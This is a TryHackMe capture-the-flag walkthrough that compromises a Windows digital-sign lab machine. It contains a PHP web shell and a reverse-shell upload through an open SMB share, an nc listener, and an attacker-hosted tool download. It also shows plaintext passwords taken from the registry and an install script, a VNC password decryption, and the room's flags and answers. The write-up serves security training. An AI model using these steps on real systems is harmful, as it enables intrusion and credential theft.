---
A room that contains a rushed Windows based Digital Sign system. Can you breach it?
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/a5b0f0ea5a8dc33948e69e28c3cc4303.jpeg)


### Enumeration

 Start Machine

Deploy the Virtual Machine and Enumerate it. Please note that it can take upto 5 minutes for the machine to fully boot.  

IP:  MACHINE_IP 

Answer the questions below

Deploy the machine

 Completed

```
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.76.135 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.76.135:21
Open 10.10.76.135:80
Open 10.10.76.135:135
Open 10.10.76.135:139
Open 10.10.76.135:443
Open 10.10.76.135:445
Open 10.10.76.135:3389
Open 10.10.76.135:5040
Open 10.10.76.135:49665
Open 10.10.76.135:49664
Open 10.10.76.135:49667
Open 10.10.76.135:49666
Open 10.10.76.135:49668
Open 10.10.76.135:49672
Open 10.10.76.135:49677
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 16:09 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:09
Completed NSE at 16:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:09
Completed NSE at 16:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:09
Completed NSE at 16:09, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:09
Completed Parallel DNS resolution of 1 host. at 16:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:09
Scanning 10.10.76.135 [15 ports]
Discovered open port 21/tcp on 10.10.76.135
Discovered open port 80/tcp on 10.10.76.135
Discovered open port 3389/tcp on 10.10.76.135
Discovered open port 139/tcp on 10.10.76.135
Discovered open port 443/tcp on 10.10.76.135
Discovered open port 135/tcp on 10.10.76.135
Discovered open port 445/tcp on 10.10.76.135
Discovered open port 5040/tcp on 10.10.76.135
Discovered open port 49668/tcp on 10.10.76.135
Discovered open port 49664/tcp on 10.10.76.135
Discovered open port 49672/tcp on 10.10.76.135
Discovered open port 49677/tcp on 10.10.76.135
Discovered open port 49666/tcp on 10.10.76.135
Discovered open port 49665/tcp on 10.10.76.135
Discovered open port 49667/tcp on 10.10.76.135
Completed Connect Scan at 16:09, 0.49s elapsed (15 total ports)
Initiating Service scan at 16:09
Scanning 15 services on 10.10.76.135
Service scan Timing: About 40.00% done; ETC: 16:12 (0:01:27 remaining)
Completed Service scan at 16:12, 162.59s elapsed (15 services on 1 host)
NSE: Script scanning 10.10.76.135.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:12
NSE Timing: About 99.76% done; ETC: 16:13 (0:00:00 remaining)
Completed NSE at 16:13, 34.34s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 16.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Nmap scan report for 10.10.76.135
Host is up, received user-set (0.24s latency).
Scanned at 2023-01-23 16:09:48 EST for 214s

PORT      STATE SERVICE        REASON  VERSION
21/tcp    open  ftp            syn-ack Microsoft ftpd
80/tcp    open  http           syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1g PHP/7.4.11)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_http-title: Simple Slide Show
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
135/tcp   open  msrpc?         syn-ack
139/tcp   open  netbios-ssn    syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/https      syn-ack Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
| SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds?  syn-ack
3389/tcp  open  ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=DESKTOP-997GG7D
| Issuer: commonName=DESKTOP-997GG7D
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-22T20:53:59
| Not valid after:  2023-07-24T20:53:59
| MD5:   4c452b3b4fc5d69b6d36f18c0f75ae81
| SHA-1: 69f81a315f3494ef05ffa53da64b34060ed2c0d6
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQd46CdVdtlKdKQPVWxJQrXTANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9ERVNLVE9QLTk5N0dHN0QwHhcNMjMwMTIyMjA1MzU5WhcNMjMw
| NzI0MjA1MzU5WjAaMRgwFgYDVQQDEw9ERVNLVE9QLTk5N0dHN0QwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDAEoZ2M2OvK1/vWXBa5qv3Wd/gmfzO6i5b
| tLtkHhYC2toAZKYL70e7RapqT3Yu+ST+S7dywrY4uDuwMEiU6FqO4A1aIeOGuil6
| wfFALIEgCHYjwMdciV2lZzjAfWQ1lTmcTEdTW0/UgpiYPlqeGIhnM9C+x2+WwKnF
| owkZtBEWovzqiq5MbHu2fwzNqT9T/cI9k42CA2ycZm1RM/SmIzUosWiWmrCWveVi
| N1QfbCR0QpseQADPqf5TtzqFG0+8PiCs0FLIQHOgel8nIzZbk1fkKfgbGF+MaI9N
| TnyJbDSqtmHt6/RbQ5TTi1vyrfYqNBC0F9PYL+L37IpvlL24C6UhAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAMiC3bOEFu+NstzIXmZzhVwdWX7Ig/o4u9Ieu/UJALfNhuXuBmEMdzEDu
| Ar3QZJi6rOxHHJM9dS9u6VOP3SmdRDLExctpjHwW8h/IPIquEgZ3v6ChI+PY15Af
| d2hUWP9Uc9WDVoI3LanqV2BaDZBGh9uaMrdUeCBFbGl6w92s1jRMi1pQPUekLPAm
| 4ELbY+nr2bnsca71fwSLDep+g3BO1/l5gJefLnjpYvzE9mnDqBJ9J/Cp7ceZhley
| UFUo9XX+YSkwJN7X1VKi3cPFzxaAJTQ1o2W3DeekL8/dgJq0ppFK2q88N6PLgOtv
| u/gCcD3m1Ula2FiekfCbom55ee6U3Q==
|_-----END CERTIFICATE-----
5040/tcp  open  unknown        syn-ack
49664/tcp open  msrpc          syn-ack Microsoft Windows RPC
49665/tcp open  msrpc          syn-ack Microsoft Windows RPC
49666/tcp open  msrpc          syn-ack Microsoft Windows RPC
49667/tcp open  msrpc          syn-ack Microsoft Windows RPC
49668/tcp open  msrpc          syn-ack Microsoft Windows RPC
49672/tcp open  msrpc          syn-ack Microsoft Windows RPC
49677/tcp open  msrpc          syn-ack Microsoft Windows RPC
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26468/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 11198/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34572/udp): CLEAN (Timeout)
|   Check 4 (port 56226/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-time: Protocol negotiation failed (SMB2)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.75 seconds

┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.10.76.135
Connected to 10.10.76.135.
220 Microsoft FTP Service
Name (10.10.76.135:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||49857|)
150 Opening ASCII mode data connection.
11-14-20  03:26PM                  173 notice.txt
226 Transfer complete.
ftp> more notice.txt
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team

┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N -L 10.10.76.135

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	images$         Disk      
	Installs$       Disk      
	IPC$            IPC       Remote IPC
	Users           Disk    

┌──(kali㉿kali)-[~/Downloads]
└─$ enum4linux -a -u "guest" -p "" 10.10.76.135
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jan 23 16:28:55 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.76.135
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.76.135 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.76.135 )================================

Looking up status of 10.10.76.135
No reply from 10.10.76.135

 ===================================( Session Check on 10.10.76.135 )===================================


[+] Server 10.10.76.135 allows sessions using username 'guest', password ''


 ================================( Getting domain SID for 10.10.76.135 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ===================================( OS information on 10.10.76.135 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.76.135 from srvinfo: 
	10.10.76.135   Wk Sv NT             
	platform_id     :	500
	os version      :	10.0
	server type     :	0x1003


 =======================================( Users on 10.10.76.135 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.76.135 )=================================

do_connect: Connection to 10.10.76.135 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	images$         Disk      
	Installs$       Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.76.135

//10.10.76.135/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.76.135/C$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.76.135/images$	Mapping: OK Listing: OK Writing: N/A
//10.10.76.135/Installs$	Mapping: OK Listing: DENIED Writing: N/A

[E] Can't understand response:

NT_STATUS_NO_SUCH_FILE listing \*
//10.10.76.135/IPC$	Mapping: N/A Listing: N/A Writing: N/A
//10.10.76.135/Users	Mapping: OK Listing: OK Writing: N/A

 ============================( Password Policy Information for 10.10.76.135 )============================


[E] Unexpected error from polenum:



[+] Attaching to 10.10.76.135 using guest

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.76.135)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: rpc_s_access_denied



[E] Failed to get password policy with rpcclient



 =======================================( Groups on 10.10.76.135 )=======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.76.135 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID: 
S-1-5-21-201290883-77286733-747258586

[I] Found new SID: 
S-1-5-21-201290883-77286733-747258586

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-21-201290883-77286733-747258586

[I] Found new SID: 
S-1-5-21-201290883-77286733-747258586

[+] Enumerating users using SID S-1-5-90 and logon username 'guest', password ''


[+] Enumerating users using SID S-1-5-32 and logon username 'guest', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)

[+] Enumerating users using SID S-1-5-21-201290883-77286733-747258586 and logon username 'guest', password ''

S-1-5-21-201290883-77286733-747258586-500 DESKTOP-997GG7D\Administrator (Local User)
S-1-5-21-201290883-77286733-747258586-501 DESKTOP-997GG7D\Guest (Local User)
S-1-5-21-201290883-77286733-747258586-503 DESKTOP-997GG7D\DefaultAccount (Local User)
S-1-5-21-201290883-77286733-747258586-504 DESKTOP-997GG7D\WDAGUtilityAccount (Local User)
S-1-5-21-201290883-77286733-747258586-513 DESKTOP-997GG7D\None (Domain Group)
S-1-5-21-201290883-77286733-747258586-1001 DESKTOP-997GG7D\sign (Local User)

──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N \\\\10.10.253.118\\images$                  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 26 13:19:19 2021
  ..                                  D        0  Tue Jan 26 13:19:19 2021
  internet-1028794_1920.jpg           A   134193  Sun Jan 10 16:52:24 2021
  man-1459246_1280.png                A   363259  Sun Jan 10 16:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Sun Jan 10 16:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 16:53:59 2021



http://10.10.253.118/images/

┌──(kali㉿kali)-[~/Downloads]
└─$ nano shell_pwn.php   
                                                       
┌──(kali㉿kali)-[~/Downloads]
└─$ cat shell_pwn.php   
<?php system($_GET['x']); ?>

┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N \\\\10.10.253.118\\images$
Try "help" to get a list of possible commands.
smb: \> put shell_pwn.php 
putting file shell_pwn.php as \shell_pwn.php (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Mon Jan 23 17:18:18 2023
  ..                                  D        0  Mon Jan 23 17:18:18 2023
  internet-1028794_1920.jpg           A   134193  Sun Jan 10 16:52:24 2021
  man-1459246_1280.png                A   363259  Sun Jan 10 16:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Sun Jan 10 16:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 16:53:59 2021
  shell_pwn.php                       A       29  Mon Jan 23 17:18:18 2023

		10861311 blocks of size 4096. 4141871 blocks available

Fatal error: Unknown: Failed opening required 'C:/xampp/htdocs/images/shell_pwn.php'

uhmm another revshell

https://www.revshells.com/ (PHP Ivan Sincek)


─$ cat payload_ivan.php 
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.

...

smb: \> put payload_ivan.php 
putting file payload_ivan.php as \payload_ivan.php (2.8 kb/s) (average 1.7 kb/s)

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.253.118.
Ncat: Connection from 10.10.253.118:49865.
SOCKET: Shell has connected! PID: 5576
whoami
ft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\images>whoami

esktop-997gg7d\sign

C:\xampp\htdocs\images>
C:\xampp\htdocs\images>quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 sign                  console             1  Active      none   23/01/2023 22:10

C:\xampp\htdocs\images>net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
images$      C:\xampp\htdocs\images          Caching disabled
Installs$    C:\Installs                     Caching disabled
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
Users        C:\Users                        
The command completed successfully.

C:\xampp\htdocs\images>cd C:\users

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users

14/11/2020  15:35    <DIR>          .
14/11/2020  15:35    <DIR>          ..
14/11/2020  14:11    <DIR>          Administrator
14/11/2020  13:14    <DIR>          Public
26/01/2021  18:19    <DIR>          sign
               0 File(s)              0 bytes
               5 Dir(s)  16,941,297,664 bytes free

C:\Users>cd sign

C:\Users\sign>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users\sign

26/01/2021  18:19    <DIR>          .
26/01/2021  18:19    <DIR>          ..
26/01/2021  18:28    <DIR>          3D Objects
26/01/2021  18:28    <DIR>          Contacts
26/01/2021  18:28    <DIR>          Desktop
26/01/2021  18:28    <DIR>          Documents
26/01/2021  18:28    <DIR>          Downloads
26/01/2021  18:28    <DIR>          Favorites
26/01/2021  18:28    <DIR>          Links
26/01/2021  18:28    <DIR>          Music
01/02/2021  16:23    <DIR>          OneDrive
26/01/2021  18:28    <DIR>          Pictures
26/01/2021  18:28    <DIR>          Saved Games
26/01/2021  18:28    <DIR>          Searches
26/01/2021  18:28    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  16,941,297,664 bytes free

C:\Users\sign>cd Desktop

C:\Users\sign\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users\sign\Desktop

26/01/2021  18:28    <DIR>          .
26/01/2021  18:28    <DIR>          ..
14/11/2020  13:15             1,446 Microsoft Edge.lnk
14/11/2020  14:32                52 user_flag.txt
               2 File(s)          1,498 bytes
               2 Dir(s)  16,941,293,568 bytes free

C:\Users\sign\Desktop>type user_flag.txt
thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}


```


How many TCP ports under 1024 are open?

*6*

What is the hidden share where images should be copied to?

Hidden shares in windows end up with a certain symbol

*images$*

###  Foothold

Gain a foothold on the box using what you found through enumeration.

Answer the questions below

What user is signed into the console session?

*sign*

What hidden, non-standard share is only remotely accessible as an administrative account?

*Installs$*

What is the content of user_flag.txt?

On the users desktop

*thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}*

### Pwnage

Find the passwords and Admin Flag

Answer the questions below

```powershell
C:\Users\sign\Desktop>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\sign\Desktop> reg query "HKLM\SOFTWARE\microsoft\windows nt\currentversion\winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x18054b5f1
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    EnableFirstLogonAnimation    REG_DWORD    0x1
    AutoLogonSID    REG_SZ    S-1-5-21-201290883-77286733-747258586-1001
    LastUsedUsername    REG_SZ    .\sign
    DefaultUsername    REG_SZ    .\sign
    DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
    AutoAdminLogon    REG_DWORD    0x1
    ARSOUserConsent    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\VolatileUserMgrKey

This key contains settings related to the Windows logon process.


In PowerShell, the "gc" (or "get-content") command is used to retrieve the contents of a text file. For example, if you want to view the contents of a file called "example.txt" you would use the following command:

`gc example.txt`

This command will display the contents of the file in the PowerShell console. Additionally, you can save the output of the "gc" command to a variable, so that you can manipulate the contents of the file in your script.

`$fileContent = gc example.txt`

You can also use wildcards to specify multiple files and even use it with pipes to filter the output


`gc .\*.log | Where-Object {$_ -like "*error*"}`


PS C:\Users\sign\Desktop> cd C:\installs
PS C:\installs> dir


    Directory: C:\installs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       14/11/2020     14:28                simepleslide                                                          
-a----       14/11/2020     15:40            548 Install Guide.txt                                                     
-a----       14/11/2020     15:19            800 Install_www_and_deploy.bat                                            
-a----       14/11/2020     13:59         339096 PsExec.exe                                                            
-a----       14/11/2020     14:01            182 simepleslide.zip                                                      
-a----       14/11/2020     15:14            147 startup.bat                                                           
-a----       14/11/2020     14:43           1292 ultravnc.ini                                                          
-a----       14/11/2020     14:00        3129968 UltraVNC_1_2_40_X64_Setup.exe                                         
-a----       14/11/2020     13:59      162450672 xampp-windows-x64-7.4.11-0-VC15-installer.exe 


PS C:\installs> gc ins*.bat
@echo off
REM Shop Sign Install Script 
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause

PS C:\installs> gc ul*.ini
[ultravnc]
passwd=B3A8F2D8BEA2F1FA70
passwd2=5AB2CDC0BADCAF13F1
[admin]
UseRegistry=0
SendExtraMouse=1
Secure=0
MSLogonRequired=0
NewMSLogon=0
DebugMode=0
Avilog=0
path=C:\Program Files\uvnc bvba\UltraVNC
accept_reject_mesg=
DebugLevel=0
DisableTrayIcon=0
rdpmode=0
noscreensaver=0
LoopbackOnly=0
UseDSMPlugin=0
AllowLoopback=1
AuthRequired=1
ConnectPriority=1
DSMPlugin=
AuthHosts=
DSMPluginConfig=
AllowShutdown=1
AllowProperties=1
AllowInjection=0
AllowEditClients=1
FileTransferEnabled=0
FTUserImpersonation=1
BlankMonitorEnabled=1
BlankInputsOnly=0
DefaultScale=1
primary=1
secondary=0
SocketConnect=1
HTTPConnect=1
AutoPortSelect=1
PortNumber=5900
HTTPPortNumber=5800
IdleTimeout=0
IdleInputTimeout=0
RemoveWallpaper=0
RemoveAero=0
QuerySetting=2
QueryTimeout=10
QueryDisableTime=0
QueryAccept=0
QueryIfNoLogon=1
InputsEnabled=1
LockSetting=0
LocalInputsDisabled=0
EnableJapInput=0
EnableUnicodeInput=0
EnableWin8Helper=0
kickrdp=0
clearconsole=0
[admin_auth]
group1=
group2=
group3=
locdom1=0
locdom2=0
locdom3=0
[poll]
TurboMode=1
PollUnderCursor=0
PollForeground=0
PollFullScreen=1
OnlyPollConsole=0
OnlyPollOnEvent=0
MaxCpu=40
EnableDriver=0
EnableHook=1
EnableVirtual=0
SingleWindow=0
SingleWindowName=

http://aluigi.altervista.org/pwdrec.htm

http://aluigi.altervista.org/pwdrec/vncpwd.zip

┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir ultraVNC_decrypt                  
                                                       
┌──(kali㉿kali)-[~/Downloads]
└─$ mv vncpwd.zip ultraVNC_decrypt 

┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
└─$ unzip vncpwd.zip 
Archive:  vncpwd.zip
  inflating: d3des.c                 
  inflating: d3des.h                 
  inflating: vncpwd.c                
  inflating: vncpwd.exe              
                                                       
┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
└─$ ls
d3des.c  d3des.h  vncpwd.c  vncpwd.exe  vncpwd.zip

┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
└─$ python3 -m http.server 8000 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.184.245 - - [23/Jan/2023 18:25:03] "GET /vncpwd.exe HTTP/1.1" 200 -

PS C:\installs> Invoke-WebRequest "http://10.8.19.103:8000/vncpwd.exe" -outfile vncpwd.exe

PS C:\Installs> ./vncpwd.exe ultravnc.ini

*VNC password decoder 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

  Password:   5upp0rt9
  Password:   

  Press RETURN to exit

or another way

┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
└─$ wine vncpwd.exe B3A8F2D8BEA2F1FA70

*VNC password decoder 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- your input password seems in hex format (or 
longer than 8 chars)

  Password:   5upp0rt9

  Press RETURN to exit

Wine is a compatibility layer that allows Windows applications to run on Linux and other Unix-like operating systems. The command you provided is using Wine to run the "vncpwd.exe" application, and passing it the argument "B3A8F2D8BEA2F1FA70". This is likely a VNC (Virtual Network Computing) password that is being passed to the "vncpwd.exe" application in order to be decrypted.


